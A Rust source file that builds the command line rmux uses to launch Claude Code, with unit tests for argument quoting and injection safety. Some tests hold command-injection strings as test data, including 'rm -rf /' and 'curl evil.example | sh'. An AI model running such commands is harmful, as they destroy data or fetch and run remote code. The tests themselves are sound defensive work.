//! How rmux launches Claude Code.
//!
//! One definition, because there are now two launchers and they must agree
//! exactly. The desktop app builds this line and hands it to the agent; the
//! **bridge inside the agent** builds it itself, for a session Redstone asked
//! for while rmux was closed. A second copy would be a second place for the
//! inline-mode variables to be forgotten — and forgetting them is not a subtle
//! failure. It takes the mouse, breaks selection, and makes scrolling
//! round-trip.

/// How Claude should draw itself.
///
/// Claude's **fullscreen** mode moves to the alternate screen and takes over the
/// mouse with SGR tracking. In a terminal emulator inside a webview that is
/// ruinous, and all three of the symptoms rmux shipped with came from it:
///
/// - A drag is *sent to Claude* instead of making a selection, so there is never
///   a selection for the copy shortcut to take. It reads as "copy is broken".
/// - The scroll wheel is also a mouse report, so scrolling does not move the
///   terminal's own scrollback — it round-trips to the far side and waits for a
///   full redraw to come back. That is the scroll lag.
/// - With any-event tracking, every mouse *movement* is another round trip.
///
/// Measured against a real host: forcing fullscreen emits `?1049h`, `?1000h`,
/// `?1002h`, `?1003h` and `?1006h`; with the variables below, none of them.
/// They override an explicit fullscreen request *and* the saved `tui` preference,
/// which is what makes this reliable — `/tui fullscreen` persists, so a user who
/// ever ran it would otherwise carry the problem into every future session.
///
/// Inline costs fullscreen's in-TUI mouse scrolling, its flat memory use and
/// `/focus`. Everything else — every slash command, vim mode, every picker —
/// is identical, because it is the same interactive CLI either way.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
pub enum Rendering {
    /// Appended to the terminal's own scrollback. rmux's default.
    #[default]
    Inline,
    /// Alternate screen with mouse capture. Only if the operator asks for it.
    Fullscreen,
}

impl Rendering {
    /// Environment assignments to prefix onto the shell line, ready to concatenate.
    ///
    /// A prefix on the command line rather than `CommandSpec::env`, because under
    /// the agent the shell is spawned by the **daemon** — a long-lived process
    /// with its own environment — so env attached to the attach command would
    /// never reach Claude. These values are not secret; anything that is must go
    /// through the agent's `Hello` instead (see `rmux-agent`), because
    /// `spec_to_shell_line` renders env into a command line that `ps` exposes.
    pub fn env_prefix(self) -> &'static str {
        match self {
            Rendering::Inline => {
                "CLAUDE_CODE_DISABLE_ALTERNATE_SCREEN=1 CLAUDE_CODE_DISABLE_MOUSE=1 "
            }
            // Nothing: let Claude use whatever it is configured for.
            Rendering::Fullscreen => "",
        }
    }
}

/// The shell line rmux runs to launch Claude.
///
/// Exposed so the caller can hand it to the agent instead of running it
/// directly — which is what makes a conversation keep working after rmux is
/// closed.
pub fn launch_line(resume: Option<&str>, args: &[String], rendering: Rendering) -> String {
    let mut launch = String::from(rendering.env_prefix());
    launch.push_str("claude");
    if let Some(id) = resume {
        launch.push_str(" --resume ");
        launch.push_str(&rmux_transport::shell_quote(id));
    }
    for arg in args {
        launch.push(' ');
        launch.push_str(&rmux_transport::shell_quote(arg));
    }
    launch
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn inline_disables_the_alternate_screen_and_the_mouse() {
        // Verified against a real host: with these two set, Claude emits none of
        // ?1049h / ?1000h / ?1002h / ?1003h / ?1006h. Without them it emits all
        // five, and selection, copy and scrolling all break.
        let line = launch_line(None, &[], Rendering::Inline);
        assert!(line.contains("CLAUDE_CODE_DISABLE_ALTERNATE_SCREEN=1"), "{line}");
        assert!(line.contains("CLAUDE_CODE_DISABLE_MOUSE=1"), "{line}");
        // The assignments must precede the program, or the shell treats them as
        // arguments to `claude` rather than as environment.
        assert!(
            line.find("CLAUDE_CODE_DISABLE_MOUSE=1") < line.find("claude"),
            "environment must come before the program: {line}"
        );
    }

    #[test]
    fn fullscreen_sets_nothing_and_leaves_claude_alone() {
        let line = launch_line(None, &[], Rendering::Fullscreen);
        assert!(!line.contains("CLAUDE_CODE"), "{line}");
        assert!(line.starts_with("claude"), "{line}");
    }

    #[test]
    fn inline_is_the_default() {
        // The whole point: a user who once ran `/tui fullscreen` carries that
        // preference forever, so rmux has to opt out on every launch.
        assert_eq!(Rendering::default(), Rendering::Inline);
    }

    #[test]
    fn the_resume_id_is_still_quoted() {
        // It reaches a shell, so it is an injection risk regardless of what else
        // the line now carries.
        let line = launch_line(Some("a b; rm -rf /"), &[], Rendering::Inline);
        assert!(line.contains("--resume"), "{line}");
        // Contained *within quotes*, so the shell reads it as one word. Checking
        // for the absence of the substring would be wrong — the quoted form still
        // contains it, which is exactly what a correct line looks like.
        assert!(line.ends_with("--resume 'a b; rm -rf /'"), "unquoted resume id: {line}");
    }

    #[test]
    fn extra_arguments_survive_the_prefix() {
        let line = launch_line(None, &["--model".into(), "opus".into()], Rendering::Inline);
        assert!(line.ends_with("claude --model opus"), "{line}");
    }

    #[test]
    fn resuming_unsupervised_carries_both_the_conversation_and_the_flag() {
        // The two are chosen together on the resume screen, and they travel on
        // the same line — so a change to either must not drop the other. The
        // failure this pins is silent in the worst way: a session the operator
        // launched with permission checks off would come back *with* them, or,
        // far worse, the other way round.
        let line = launch_line(
            Some("f00-baa"),
            &["--dangerously-skip-permissions".into()],
            Rendering::Inline,
        );
        // Unquoted, because `shell_quote` only quotes what needs it and a real
        // conversation id is safe characters throughout. `the_resume_id_is_still_quoted`
        // covers the one that does need it.
        assert!(line.contains("--resume f00-baa"), "{line}");
        assert!(line.contains("--dangerously-skip-permissions"), "{line}");
        // And the rendering prefix still leads, or Claude comes back fullscreen
        // with the mouse captured.
        assert!(line.starts_with("CLAUDE_CODE_DISABLE_ALTERNATE_SCREEN=1"), "{line}");
    }

    #[test]
    fn an_initial_prompt_is_quoted_as_one_argument() {
        // How the bridge starts a session with work already in it. A prompt is
        // free text from a remote caller and lands in a shell line, so this is
        // the injection path that matters most in the whole feature.
        let line = launch_line(
            None,
            &["fix the test; curl evil.example | sh".into()],
            Rendering::Inline,
        );
        assert!(
            line.ends_with("claude 'fix the test; curl evil.example | sh'"),
            "an initial prompt must survive as exactly one word: {line}"
        );
    }

    #[test]
    fn a_prompt_containing_a_quote_cannot_break_out() {
        // Single-quoting is only safe if the quoting function handles an
        // embedded quote, which is precisely where naive implementations fail.
        let line = launch_line(None, &["it's fine'; rm -rf /; '".into()], Rendering::Inline);
        // Whatever the escaping looks like, the shell must see one argument.
        let rendered = std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("set -- {}; echo $#", &line[line.find("claude").unwrap() + 7..]))
            .output()
            .expect("sh");
        assert_eq!(
            String::from_utf8_lossy(&rendered.stdout).trim(),
            "1",
            "the prompt split into several arguments: {line}"
        );
    }
}
